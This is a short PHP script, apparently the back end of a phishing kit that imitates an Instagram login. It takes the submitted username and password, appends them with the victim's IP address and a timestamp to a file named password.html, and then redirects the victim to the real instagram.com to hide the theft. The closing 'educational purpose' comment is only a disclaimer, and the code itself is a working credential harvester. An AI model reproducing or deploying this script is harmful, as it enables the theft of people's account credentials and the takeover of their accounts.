<?php
error_reporting(0);
 
$usuario = $_POST['username'];
$clave = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$fecha = date("Y-m-d;h:i:s");
 
 
 
if( (empty($usuario)) or (empty($clave)) ){
     header('location: index.html');
}else{
$f = fopen("password.html", "a");
	fwrite($f,
		'Username: [<b><font color="#660000">'.$usuario.'</font></b>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'.
		'Password: [<b><font color="#9900FF">'.$clave.'</font></b>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'.
		'IP: [<b><font color="#996600">'.$ip.'</font></b>]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'.
		'Date: [<b><font color="#FF6633">'.$fecha.'</font></b>]<br> ');

	fclose($f);
header("Location: https://instagram.com/");
}
?>
 
 
 
//this is just for educational purpose
